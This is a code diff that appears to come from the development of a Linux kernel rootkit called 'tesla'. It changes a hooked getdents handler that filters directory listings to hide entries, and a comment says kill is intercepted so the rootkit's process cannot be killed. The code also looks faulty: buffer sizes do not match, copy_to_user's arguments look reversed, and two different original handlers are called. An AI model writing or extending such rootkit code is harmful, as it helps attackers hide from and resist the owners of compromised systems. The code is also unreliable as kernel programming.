@@ -43,9 +43,9 @@ asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-    char *p1 = kmalloc(count, GFP_KERNEL);
-	char *p2 = kmalloc(count, GFP_KERNEL);
 	int ret = orig_dents(fd, dirp, count);
+    char *p1 = kmalloc(ret, GFP_KERNEL);
+	char *p2 = 0;
 	int i = 0;
 	if (copy_from_user(p1, dirp, count) != 0) {
 		return -EACCES;
@@ -59,7 +59,11 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 			p2 = (struct linux_dirent*)((char *)p2 + p2->d_reclen);
 		}
 	}
-	copy_to_user(p1, dirp, count);
+	
+	if(copy_to_user(p1, dirp, count) != 0) {
+		return -EACCES;
+	}
+	return orig_getdents(fd, dirp, count);
 }
 
 /* we intercept kill so that our process can not be killed */
